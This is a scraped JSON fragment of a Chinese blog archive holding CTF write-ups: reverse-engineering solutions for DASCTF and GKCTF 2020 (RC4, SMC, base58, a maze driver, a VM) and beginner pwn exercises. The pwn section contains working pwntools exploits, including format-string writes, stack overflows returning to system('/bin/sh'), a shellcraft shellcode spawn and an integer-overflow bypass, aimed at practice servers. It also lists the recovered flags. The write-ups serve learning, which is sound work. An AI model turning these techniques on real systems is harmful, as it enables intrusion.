Nep{mYrclU_a~dOmaxoOisonotofree} Nep{mYrclU_a~d_mahoOisonotofree} Nep{mYrclU_a~domaXoOisonotofree} Nep{mYrcle_a^dOmaxoois_notofree} Nep{mYrcle_a^d_mahoois_notofree} Nep{mYrcle_a^domaXoois_notofree} Nep{mYrcle_andOmaxo_is_notofree} Nep{mYrcle_and_maho_is_notofree} Nep{mYrcle_andomaXo_is_notofree} Nep{mYrcle_a~dOmaxoOis_notofree} Nep{mYrcle_a~d_mahoOis_notofree} Nep{mYrcle_a~domaXoOis_notofree} Nep{mYrclu_a^dOmaxooisOnotofree} Nep{mYrclu_a^d_mahooisOnotofree} Nep{mYrclu_a^domaXooisOnotofree} Nep{mYrclu_andOmaxo_isOnotofree} Nep{mYrclu_and_maho_isOnotofree} Nep{mYrclu_andomaXo_isOnotofree} Nep{mYrclu_a~dOmaxoOisOnotofree} Nep{mYrclu_a~d_mahoOisOnotofree} Nep{mYrclu_a~domaXoOisOnotofree} Nep{mirclU_a^dOmaxooisonot_free} Nep{mirclU_a^d_mahooisonot_free} Nep{mirclU_a^domaXooisonot_free} Nep{mirclU_andOmaxo_isonot_free} Nep{mirclU_and_maho_isonot_free} Nep{mirclU_andomaXo_isonot_free} Nep{mirclU_a~dOmaxoOisonot_free} Nep{mirclU_a~d_mahoOisonot_free} Nep{mirclU_a~domaXoOisonot_free} Nep{mircle_a^dOmaxoois_not_free} Nep{mircle_a^d_mahoois_not_free} Nep{mircle_a^domaXoois_not_free} Nep{mircle_andOmaxo_is_not_free} Nep{mircle_and_maho_is_not_free} Nep{mircle_andomaXo_is_not_free} Nep{mircle_a~dOmaxoOis_not_free} Nep{mircle_a~d_mahoOis_not_free} Nep{mircle_a~domaXoOis_not_free} Nep{mirclu_a^dOmaxooisOnot_free} Nep{mirclu_a^d_mahooisOnot_free} Nep{mirclu_a^domaXooisOnot_free} Nep{mirclu_andOmaxo_isOnot_free} Nep{mirclu_and_maho_isOnot_free} Nep{mirclu_andomaXo_isOnot_free} Nep{mirclu_a~dOmaxoOisOnot_free} Nep{mirclu_a~d_mahoOisOnot_free} Nep{mirclu_a~domaXoOisOnot_free} Nep{myrclU_a^dOmaxooisonotOfree} Nep{myrclU_a^d_mahooisonotOfree} Nep{myrclU_a^domaXooisonotOfree} Nep{myrclU_andOmaxo_isonotOfree} Nep{myrclU_and_maho_isonotOfree} Nep{myrclU_andomaXo_isonotOfree} Nep{myrclU_a~dOmaxoOisonotOfree} Nep{myrclU_a~d_mahoOisonotOfree} Nep{myrclU_a~domaXoOisonotOfree} Nep{myrcle_a^dOmaxoois_notOfree} Nep{myrcle_a^d_mahoois_notOfree} Nep{myrcle_a^domaXoois_notOfree} Nep{myrcle_andOmaxo_is_notOfree} Nep{myrcle_and_maho_is_notOfree} Nep{myrcle_andomaXo_is_notOfree} Nep{myrcle_a~dOmaxoOis_notOfree} Nep{myrcle_a~d_mahoOis_notOfree} Nep{myrcle_a~domaXoOis_notOfree} Nep{myrclu_a^dOmaxooisOnotOfree} Nep{myrclu_a^d_mahooisOnotOfree} Nep{myrclu_a^domaXooisOnotOfree} Nep{myrclu_andOmaxo_isOnotOfree} Nep{myrclu_and_maho_isOnotOfree} Nep{myrclu_andomaXo_isOnotOfree} Nep{myrclu_a~dOmaxoOisOnotOfree} Nep{myrclu_a~d_mahoOisOnotOfree} Nep{myrclu_a~domaXoOisOnotOfree} 但是根据常识可以找到Nep{mircle_and_maho_is_not_free}\n之后该flag参与一段smc，众所周知单层smc和没有是一样的\n但是这个题后面出现了奇怪的东西\nsmc内部： # v2 = 37; v3 = 110; v4 = 49; v5 = 19; v6 = 47; v7 = 40; v8 = 32; v9 = 60; v10 = 53; v11 = 52; v12 = 48; v13 = 109; v14 = 59; v15 = 54; v16 = 7; v17 = 60; v18 = 56; v19 = 127; v20 = 93; v21 = 84; v22 = 40; v23 = 30; v24 = 26; v25 = 47; v26 = 59; v27 = 43; v28 = 85; v29 = 54; v30 = 73; v31 = 109; v32 = 102; v33 = 126; v34 = 0; v35 = 1601399123; v36 = 1818588528; v37 = 1834967404; v0 = __inbyte(0x66u); v38 = 8545; v39 = BYTE2(dword_405150); v40 = 0i64; v41 = 0; v42 = 0; for ( i = 0; i \u0026lt; strlen(flag); ++i ) *((_BYTE *)\u0026amp;v43 + i - 73) = *((_BYTE *)\u0026amp;v43 + (signed int)i % 18 - 37) ^ *((_BYTE *)\u0026amp;v43 + 4 * i - 205) ^ flag[i]; 后面并没有对flag进行判断，直接把flag跑出来了。。。。\n.scode:00403219 loc_403219: .scode:00403219 0EC xor ecx, eax .scode:0040321B 0EC mov edx, [ebp-0D8h] .scode:00403221 0EC mov [ebp+edx-4Ch], cl \u0026lt;--- .scode:00403225 1D8 jmp loc_403186 Stack[0000633C]:0019FE58 a8b272473500a45 db \u0026#39;8b272473500a451286ab225413f1debd\u0026#39;,0 8b272473500a451286ab225413f1debd\n521 # 看起来花里胡哨的rc4\ncpp程序直接对着伪代码调试也可以得到比较好的效果\nv16 = __readfsqword(0x28u); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;FLAG, a2); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;a3, a2, v2); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;v13, a2, v3); init_key((__int64)v15);//秘钥生成 std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator=(\u0026amp;a3, v15); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v15); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::length(); if ( v4 != 37 ) { a1 = 0; v5 = 0; } else { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v15, \u0026amp;FLAG); v6 = chk2((__int64)v15); // 判断格式 std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v15); if ( v6 ) { qmemcpy(v15, \u0026amp;unk_55AD074D7DC0, sizeof(v15)); encode((__int64)\u0026amp;FLAG_1, (__int64)\u0026amp;FLAG, (__int64)\u0026amp;a3);//RC4加密 std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator=(\u0026amp;v13, \u0026amp;FLAG_1); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(\u0026amp;FLAG_1); for ( i = 0; ; ++i ) { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::length(); if ( i \u0026gt;= v7 ) break; if ( *(char *)std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[](\u0026amp;v13, i) != v15[i] ) { a1 = 0; { __int64 result; // rax unsigned int v5; // eax unsigned int v6; // [rsp+1Ch] [rbp-Ch] int v7; // [rsp+20h] [rbp-8h] unsigned int i; // [rsp+24h] [rbp-4h] rc4_init(a3, a4); v6 = 0; v7 = 0; for ( i = 0; ; ++i ) { result = i; if ( a2 \u0026lt;= i ) break; v6 = (unsigned __int8)(((unsigned int)((signed int)(v6 + 1) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24) + v6 + 1) - ((unsigned int)((signed int)(v6 + 1) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24); v5 = (unsigned int)((v7 + tab[v6]) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24; v7 = (unsigned __int8)(v5 + v7 + tab[v6]) - v5; exchange((char *)\u0026amp;tab[v6], (char *)\u0026amp;tab[v7]); *(_BYTE *)((signed int)i + a1) ^= tab[(unsigned __int8)(tab[v6] + tab[v7])]; } return result; } 很明显的rc4,对着异或点看数据就行了\nl = [0x80, 0x59, 0x23, 0x35, 0x2b, 0x4, 0x8f, 0x1e, 0x55, 0x26, 0x32, 0xe8, 0x50, 0x57, 0x81, 0xa, 0xc4, 0x94, 0x25, 0xdc, 0x84, 0x69, 0x76, 0xe6, 0x54, 0xb, 0x6e, 0xf3, 0x53, 0x31, 0x62, 0x49, 0xc, 0xff, 0xff, 0xfa, 0x22, 0x0] flag = [0x4e, 0x65, 0x70, 0x7b, 0x31, 0x32, 0x33, 0x41, 0x42, 0x43, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x7d, 0x0] encode = [0x80, 0x59, 0x23, 0x35, 0x22, 0x73, 0x8d, 0x1a, 0x51, 0x5d, 0x30, 0xe8, 0x57, 0x26, 0xf6, 0x7, 0xc6, 0x92, 0x5e, 0xdc, 0x83, 0x1f, 0x76, 0x92, 0x25, 0xf, 0x65, 0xfb, 0x2e, 0x4d, 0x6b, 0x45, 0x3, 0x87, 0xe9, 0x9f, 0x22, 0x0] for i in range(37):\tprint(chr(encode[i]^(l[i]^flag[i])),end=\u0026#39;\u0026#39;) Nep{8E1EF8215BC841CAE5D17CCA77EAA7F4}\npyCharm # 我摊牌了,这题我蒙的 :D 把很可疑的字符串拿出来,试了试是不行的,又觉得a很可疑,把a全去掉就可以正常解base64了\u0026hellip;.\nYamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM= \u0026gt;\u0026gt; YmNlZTcxZDhjYmI0NDU3YjUwNWNjMjUwNWI3M2NhMGM= \u0026gt;\u0026gt; bcee71d8cbb4457b505cc2505b73ca0c ","date":"27 June 2020","permalink":"/achieve/2019to2021/dasctf-2020-6/","section":"archive","summary":"端午节回山里玩了一趟，做题时间仅有半天，做了的依旧只有re。。。。","title":"安恒六月赛-2020-re部分"},{"content":" 发现GKCTF在buu上面挂了好久，干脆做着玩玩好了\nCheck_1n # 打开一看，是一个 真-虚拟机，vm看了直呼内行\n直接找字符串\n解出来是这样的\nWhy don\u0026rsquo;t you try the magic brick game\n然后又找到一串很像密文的字符串\n看一下调用了他的函数\ndecode: # for ( i = 0; i \u0026lt; str; ++i ) { v3 = byte_175E270[(unsigned __int8)a1[i]]; if ( v3 \u0026lt; 0 ) { sub_406B70(v8); return 0; } for ( j = \u0026amp;v8[v9 - 1]; j \u0026gt;= str2; --j ) { v2 = 58 * (unsigned __int8)*j + v3; *j = v2 % 0x100; v3 = BYTE1(v2); } if ( v3 \u0026gt; 0 ) { if ( --str2 \u0026lt; v8 ) { sub_406B70(v8); return 0; } *str2 = v3; } } for ( k = 0; k \u0026lt; \u0026amp;v8[v9] - str2; ++k ) v8[k] = str2[k]; v8[k] = 0; return v8; 是base58的算法，直接在线解就可以了\nflag{f5dfd0f5-0343-4642-8f28-9adbb74c4ede}\nbabyDriver # 0x140001380里面是一个迷宫\ncode: # __int64 __fastcall map_0(__int64 a1, __int64 str_2) { __int64 v2; // rbx __int64 str_1; // rdi __int64 v4; // rax int local; // ecx __int16 *str; // rsi __int64 Sbox; // rbp __int16 s; // dx char siep; // dl CHAR *v10; // rcx v2 = str_2; if ( *(_DWORD *)(str_2 + 48) \u0026gt;= 0 ) { str_1 = *(_QWORD *)(str_2 + 24); v4 = *(_QWORD *)(str_2 + 56) \u0026gt;\u0026gt; 3; if ( (_DWORD)v4 ) { local = value1; str = (__int16 *)(str_1 + 2); Sbox = (unsigned int)v4; while ( *(_WORD *)(str_1 + 4) ) { LABEL_28: str += 6; if ( !--Sbox ) goto LABEL_29; } map[local] = 46; s = *str; if ( *str == \u0026#39;\\x17\u0026#39; ) { if ( local \u0026amp; 0xFFFFFFF0 ) { local -= 0x10; goto LABEL_21; } local += 0xD0; value1 = local; } if ( s == \u0026#39;%\u0026#39; ) { if ( (local \u0026amp; 0xFFFFFFF0) != 0xD0 ) { local += 16; goto LABEL_21; } local -= 0xD0; value1 = local; } if ( s == \u0026#39;$\u0026#39; ) { if ( local \u0026amp; 0xF ) { --local; goto LABEL_21; } local += 15; value1 = local; } if ( s != \u0026#39;\u0026amp;\u0026#39; ) goto LABEL_22; if ( (local \u0026amp; 0xF) == 15 ) local -= 15; else ++local; LABEL_21: value1 = local; LABEL_22: siep = map[local]; if ( siep == \u0026#39;*\u0026#39; ) { v10 = \u0026#34;failed!\\n\u0026#34;; } else { if ( siep != \u0026#39;#\u0026#39; ) { LABEL_27: map[local] = \u0026#39;o\u0026#39;; goto LABEL_28; } v10 = \u0026#34;success! flag is flag{md5(input)}\\n\u0026#34;; } value1 = 16; DbgPrint(v10); local = value1; goto LABEL_27; } } LABEL_29: if ( *(_BYTE *)(v2 + 65) ) *(_BYTE *)(*(_QWORD *)(v2 + 184) + 3i64) |= 1u; return *(unsigned int *)(v2 + 48); } 乍一看 local 的变化有些地方毫无章法,再仔细一看发现是用来判断是否到底的,如果到边界就从另一边出来\nmap: # o X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X # X 因为是驱动文件所以字符是以键盘扫描码的形式输入的\n对应表： https://blog.csdn.net/wenweimin/article/details/105561\n注意键盘扫描码全是大写\n把迷宫走出来转md5\nLKKKLLKLKKKLLLKKKLLLLLL flag{403950a6f64f7fc4b655dea696997851}\nChelly\u0026rsquo;s identity # 这个题还比较有意思,可惜还是单字节加密\n直接动调到加密位置\ndemo # _DWORD *flag;//注意flag变成int了 while ( flag != (_DWORD *)v6 ) { v5 = 0; v4 = 0; for ( i = (_DWORD *)sub_3B1325(\u0026amp;v8, 0); *i \u0026lt; *flag; i = (_DWORD *)sub_3B1325(\u0026amp;v8, v4) ) v5 += *(_DWORD *)sub_3B1325(\u0026amp;v8, v4++); *flag ^= v5; ++flag; } 函数sub_3B1325里面的东西很不知所云,直接看汇编算了\n发现这里从一个素数表取数和flag的值做对比，异或值是素数累加的值，分析得出算法：\ndome # l=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127] # l是素数表 s1=[]#前n个素数和 for i in range(len(l)): ans+=l[i] print(ans,i,l[i]) s1.append(ans) s=\u0026#34;Che11y_1s_EG0IST\u0026#34; s2=[] for i in s:#是是flag for j in range(len(l)): if l[j] \u0026gt;= ord(i): s2.append((ord(i)^(s1[j-1]))) 爆破就行了：\nexp # encode=[438,1176,1089,377,377,1600,924,377,1610,924,637,639,376,566,836,830] s=\u0026#34;!\\\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}\u0026#34; tab =[129, 130, 131, 132, 133, 227, 226, 237, 236, 196, 197, 309, 308, 311, 310, 376, 377, 378, 379, 380, 381, 331, 330, 325, 324, 327, 326, 388, 389, 459, 458, 437, 436, 439, 438, 636, 637, 638, 639, 567, 566, 642, 643, 644, 645, 646, 647, 839, 838, 837, 836, 830, 831, 828, 829, 818, 819, 921, 920, 927, 926, 925, 924, 931, 930, 1094, 1095, 1088, 1089, 1263, 1262, 1176, 1177, 1178, 1179, 1335, 1334, 1446, 1447, 1464, 1465, 1611, 1610, 1613, 1612, 1615, 1614, 1601, 1600, 1603, 1602, 1605, 1604] # tab是s的密文 for i in encode: print(s[tab.index(i)],end=\u0026#39;\u0026#39;) Che11y_1s_EG0IST\nEzMachine # 虚拟机，先找vm的部分：\n这个大循环基本就是vm的主体了,通过改变这个 call 调用的函数来传递参数和对flag进行计算\n经过漫长的调试发现在取从flag中取字符串的函数后会调用好几个用减法来进行对比的函数,发现程序用这种方式来判断字符串的范围\n.text:00E81300 cheak proc near ; DATA XREF: .data:00EC4954↓o .text:00E81300 mov edx, time .text:00E81306 movzx eax, byte ptr unk_EC49A2[edx] .text:00E8130D mov ecx, ds:off_EC27FC[eax*4] .text:00E81314 movzx eax, byte_EC49A1[edx] .text:00E8131B add edx, 3 .text:00E8131E mov time, edx .text:00E81324 mov eax, ds:off_EC27FC[eax*4] .text:00E8132B mov eax, [eax] .text:00E8132D sub eax, [ecx] \u0026lt;------ flag值 减去 对比值 通过结果的大小来判断值的范围 .text:00E8132F mov cheak_return, eax .text:00E81334 retn .text:00E81334 cheak endp 之后几个计算的函数有无又计算符的关系还比较方便分析,最后可以搞定加密的代码,再观察最后对比的方式可以找到传参方式\ncipher=[] or i in s1: print(i,end=\u0026#39; \u0026#39;) if \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;.find(i) != -1: cipher.append(((ord(i)^0x47)+1)//0x10) cipher.append(((ord(i)^0x47)+1)%0x10) if \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;.find(i) != -1: cipher.append(((ord(i)^0x4b)-1//0x100)) cipher.append(((ord(i)^0x4b)-1%0x100)) elif \u0026#39;_{}\u0026#39;.find(i) !=-1: cipher.append(ord(i)//100) cipher.append(ord(i)%100) cipher=cipher[::-1]#最后对比的时候在内存里面的值有点魔幻,但基本能弄出来 又是单字节加密,把所有科显示字符弄出来一一对应再去掉题目不要求的字符就可以了\ns1=\u0026#39;!\\\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}\u0026#39; tab =[33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 9, 8, 7, 14, 13, 12, 11, 2, 1, 0, -1, 6, 5, 4, 3, 26, 25, 24, 23, 30, 29, 28, 27, 18, 17, 16, 91, 92, 93, 94, 95, 96, 39, 38, 37, 36, 35, 34, 33, 48, 47, 46, 45, 44, 43, 42, 41, 56, 55, 54, 53, 52, 51, 50, 49, 64, 63, 62, 123, 124, 125] ans=[0x22,0x2c,0x27,0x21,0x7b,0x17,0x33,0x25,0x30,0x5f,0x9,0x5f,0xd,0x10,0x1c,0x5,0x7d] for i in ans: for j in range(len(tab)): if tab[j] == i: print(s1[j],end=\u0026#39;\u0026#39;) 然后把题目不要求的字符去掉\nf,l\u0026rsquo;a!g{S3u%c0h_A_EZVM} flag{Such_A_EZVM}\nDbgIsFun # 晚上闲着没事就干脆做了，明天把剩下的都做了吧，找不到wp反而更刺激了\n开局就看到TLS,反调试预定，调试后发现中间的异或是再解smc，众所周知单层smc和没有是一样的（x）\n下断点看看 sub_4010F0 里面\ndemo: # while ( !dword_41A8E0 ) Sleep(0x3E8u); for ( i = 0; i \u0026lt; 140; ++i ) byte_41A8DE += *((_BYTE *)\u0026amp;loc_401540 + i); for ( i = 0; flag[i]; ++i ) flag[i] ^= byte_41A8DE; v10 = 71; v11 = 75; v12 = 67; v13 = 84; v14 = 70; for ( j = 0; j \u0026lt; 256; ++j ) list[j] = j; for ( j = 0; j \u0026lt; 256; ++j ) v8[j] = *((_BYTE *)\u0026amp;v10 + 4 * (j % 5)); v20 = 0; for ( j = 0; j \u0026lt; 256; ++j ) { v20 = (v8[j] + list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; } v18 = len; v16 = 0; v20 = 0; j = 0; while ( 1 ) { v4 = v18--; if ( !v4 ) break; j = (j + 1) % 256; v20 = (list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; v15 = (list[v20] + list[j]) % 256; Sbox[v16++] = list[v15]; } for ( j = 0; j \u0026lt; len; ++j ) v23[j] = LOBYTE(Sbox[j]) ^ flag[j]; v22 = v23; if ( j != len \u0026amp;\u0026amp; j == len ) JUMPOUT(0xD04FE8DB); v5 = 0; while ( v5 \u0026lt; len ) { if ( v22[v5] != *(_BYTE *)(v5 + 4199594) ) { sub_401640(4199659, v25); sub_405183(0); break; } if ( ++v5 ) { if ( !v5 ) JUMPOUT(0x6EAF8766u); } } sub_401640(\u0026#34;right\\n\u0026#34;, v24); sub_403AFA(); return 0; } 十分明显的RC4，rc4之前将flag每个字符的值异或上了0xc9\n题目到这里已经做完了，到0x4014AA里面去拿数据直接rc4就完事了\n但是注意，动调时和非动调时内存0x4014AA里面的值因为smc解码的原因，所以是不一样的\n然后继续动调可以发现前面的rc4函数是可以进去的，但是因为反调试，flag的输入被跳过了，但是这并不影响后续流程\n这里Sleep的计时器因为没有pdb文件所以会出错,改dword_41A8E0的值跳过\n出现在数据段的神必字符串： X:\\I_am_afraid_there_is_no_PDB_file_for_you_my_friend:D\nwhile ( !dword_41A8E0 ) Sleep(0x3E8u); 因为没有 flag 输入所以 len 是0，这里是可以自己算的，但作为一条懒狗完全体，能让程序做的事情我们坚决不做\nbraekpoint # v18 = len; \u0026lt;---改大一点 v16 = 0; v20 = 0; j = 0; while ( 1 ) { v4 = v18--; if ( !v4 ) break; j = (j + 1) % 256; v20 = (list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; v15 = (list[v20] + list[j]) % 256; Sbox[v16++] = list[v15]; } for ( j = 0; j \u0026lt; len; ++j ) \u0026lt;---下断点拿数据 v23[j] = LOBYTE(Sbox[j]) ^ flag[j]; exp # encode=[0x2d,0xd4,0xf,0xd0,0x54,0xee,0x75,0xd0,0xe0,0x30,0x96,0xe1,0x79,0x8a,0xe0,0xfe,0x18,0x3a,0x27,0xe7,0x2f,0x86,0xc9,0xfe,0x66,0x43,0xa7,0x75,0x33,0xdb,0x8b,0xd,0xe4,0xa8,0x41,0x0,0x3b,0xd9,0x7d,0x38,0x8b,0x85,0xf8,0xff,0xfe,0xff,0x8a,0x4,0x18,0x8a,0x93,0xaa,0x14,0x40,0x0,0x3a,0xc2,0x75,0x14,0x43,0x74,0xe0,0x75,0xde] key = [0x82,0x71,0xa7,0x7e,0xe6,0x12,0xc8,0x78,0x50,0xcd,0x28,0x49,0xc9,0x5,0x5b,0x7,0xbc,0xcb,0x9c,0x4b,0x87,0x24,0x70,0x7,0xc6,0xe4,0x1a,0xc1,0xe5,0x1b,0x13,0x3c,0x87,0x85,0xde,0xa4,0x77,0xae,0xdb,0x9b,0xb7,0x40,0x11,0x4a,0xc3,0xc,0x1b] print(\u0026#39;\u0026#39;) for i in range(28): print(chr((key[i]^encode[i])^0xc9),end=\u0026#39;\u0026#39;) flag{5tay4wayFr0m8reakp0int}\n","date":"16 June 2020","permalink":"/achieve/2019to2021/gkctf2020%E9%80%86%E5%90%91wp/","section":"archive","summary":"发现GKCTF在buu上面挂了好久，干脆做着玩玩好了","title":"GkCTF2020逆向wp"},{"content":"\rstring： # 格式化字符串漏洞 x64传参规则 抄来的原理 # 原理挺底层的，得认真看看 https://blog.csdn.net/qq_43394612/article/details/84900668\nputs(\u0026#34;A voice heard in your mind\u0026#34;); puts(\u0026#34;\u0026#39;Give me an address\u0026#39;\u0026#34;); _isoc99_scanf(\u0026#34;%ld\u0026#34;, \u0026amp;address);//利用这个传一个地址进去 puts(\u0026#34;And, you wish is:\u0026#34;); _isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;format); puts(\u0026#34;Your wish is\u0026#34;); printf(\u0026amp;format); //存在格式化字符串漏洞 可以改变地址内的值 puts(\u0026#34;I hear it, I hear it....\u0026#34;); exp： # from pwn import * context.arch=\u0026#39;amd64\u0026#39; # 明确程序类型不同系统生成的shellcraft.sh()不同 io = process(\u0026#39;./string\u0026#39;) io.recvuntil(\u0026#34;secret[0] is \u0026#34;) addr = int(io.recvuntil(\u0026#34;\\n\u0026#34;)[:-1], 16)# 接收屏幕打印出来的地址 io.sendlineafter(\u0026#34; character\u0026#39;s name be:\u0026#34;,\u0026#39;cxk\u0026#39;) io.sendlineafter(\u0026#34; go?east or up?:\u0026#34;,\u0026#39;east\u0026#39;) io.sendlineafter(\u0026#34;go into there(1), or leave(0)?:\u0026#34;,\u0026#39;1\u0026#39;) io.sendlineafter(\u0026#34;\u0026#39;Give me an address\u0026#39;\u0026#34;, str(int(addr)))# 将地址放入栈内 io.sendlineafter(\u0026#34;you wish is:\u0026#34;,\u0026#34;%85c%7$n\u0026#34;) # 改变地址指向的值（即改第8个参数） shellcode = asm(shellcraft.sh())# 将shellcode转成机械码 io.sendlineafter(\u0026#34;USE YOU SPELL\u0026#34;, shellcode) io.interactive() 85c%7$n是改参数的其中一种方法\nCGfsb： # 格式化字符串漏洞 x86传参规则 memset(\u0026amp;s, 0, 0x64u); puts(\u0026#34;please tell me your name:\u0026#34;); read(0, \u0026amp;buf, 10u); puts(\u0026#34;leave your message please:\u0026#34;); fgets(\u0026amp;s, 100, stdin); printf(\u0026#34;hello %s\u0026#34;, \u0026amp;buf);//利用这个把 pwnme pwn掉 puts(\u0026#34;your message is:\u0026#34;); printf(\u0026amp;s); if ( pwnme == 8 ) { puts(\u0026#34;you pwned me, here is your flag:\\n\u0026#34;); system(\u0026#34;cat flag\u0026#34;); } 错误的exp # add = 0x0804A068 io.recvuntil(\u0026#34;please tell me your name:\u0026#34;) payload = p32(add) io.sendline(payload) io.recvuntil(\u0026#34;leave your message please:\u0026#34;) io.sendline(b\u0026#39;%8c%2$n\u0026#39;) io.interactive() printf(a)才能用\n正确的exp # from pwn import * io = remote(\u0026#34;220.249.52.133\u0026#34;,35348) add = 0x0804A068 io.recvuntil(\u0026#34;please tell me your name:\u0026#34;) io.sendline(\u0026#39;cxk\u0026#39;) io.recvuntil(\u0026#34;leave your message please:\u0026#34;) io.sendline(p32(0x0804A068) + b\u0026#39;%c%10$n\u0026#39;) # 调试一下可以看到这里的数据被原封不动放到了 esp 后面，按照 x86 的规律数一下可以看到 0x0804A068 在第十个参数的位置 ，在这里 p32(0x0804A068) 已经占了4个用于输出的位置还需要4个输出字符才能够将地址指向的参数pwn_me改成8 io.interactive() cgpwn2 # 构造payload打return gets(\u0026amp;s);\n返回函数覆盖为\nexp: # from pwn import * r = remote(\u0026#34;220.249.52.133\u0026#34;, 59988) system=0x08048420 r.recvuntil(\u0026#39;name\u0026#39;) r.sendline(\u0026#34;/bin/sh\u0026#34;) name=0x0804A080 payload = b\u0026#39;a\u0026#39; * (0x26+4) + p32(system)+p32(0)+p32(0x0804A080) # 因为32位函数和参数中间是system的 返回地址用 p32(0)填充 r.sendline(payload) #print(r.recv()) #print(r.recv()) r.interactive() # 0804A024 /bin/sh # 08048320 system int_overflow # 利用小整型（int8）溢出绕过检测点 栈溢出改变程序流程 char *__cdecl check_passwd(char *str) { char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(str);//v3大于255后溢出 if ( v3 \u0026lt;= 3u || v3 \u0026gt; 8u ) { puts(\u0026#34;Invalid Password\u0026#34;); result = (char *)fflush(stdout); } else { puts(\u0026#34;Success\u0026#34;); fflush(stdout); result = strcpy(\u0026amp;dest, str);//覆盖dest 后的r } return result; exp： # from pwn import * #设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口 r = remote(\u0026#34;220.249.52.133\u0026#34;, 33284) system=0x0804868B r.sendlineafter(\u0026#34;Your choice:\u0026#34;, \u0026#34;1\u0026#34;) r.sendlineafter(\u0026#34;your username:\u0026#34;, \u0026#34;kk\u0026#34;) r.recvuntil(\u0026#34;your passwd:\u0026#34;) payload = b\u0026#39;a\u0026#39; * (0x14+4) + p32(system) + 231*b\u0026#39;a\u0026#39; #payload=payload.ljust(259,b\u0026#39;a\u0026#39;) print(len(payload)) r.sendline(payload) r.recv() r.interactive() rip # 栈溢出 玄学问题 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+1h] [rbp-Fh] puts(\u0026#34;please input\u0026#34;); gets((__int64)\u0026amp;s, (__int64)argv);//打这里 puts(\u0026amp;s); puts(\u0026#34;ok,bye!!!\u0026#34;); return 0; } 中间会碰到一个玄学的问题: http://blog.eonew.cn/archives/958\n把源存储器内容值送入目的寄存器,当有m128时, 内存地址必须是16字节对齐的。 XMMWORD旨在表示与m128相同的类型,刚好这里符合第二条。\n就是说payload会导致栈的地址可以不是按0x10对齐的，会导致程序crash掉 这时改变payload的长度是解决方法之一\n直接更改我们的payload长度，在栈溢出的时候栈的地址自然不同，然后将栈地址+1，如果不行的话，就继续增加，最多也就改16次就一定会遇到栈对齐的情况。\nexp # from pwn import* sh=remote(\u0026#34;node3.buuoj.cn\u0026#34;,28364) payload=b\u0026#39;a\u0026#39;*23+p64(0x401016)+p64(0x401186) sh.sendline(payload) sh.interactive() ","date":"12 June 2020","permalink":"/achieve/2019to2021/%E5%87%A0%E4%B8%AA%E6%96%B0%E6%89%8Bpwn/","section":"archive","summary":"string： # 格式化字符串漏洞 x64传参规则 抄来的原理 # 原理挺底层的，得认真看看 https://blog.","title":"新手pwn练习汇总"},{"content":" 太马了。。。。\nrust-flag # 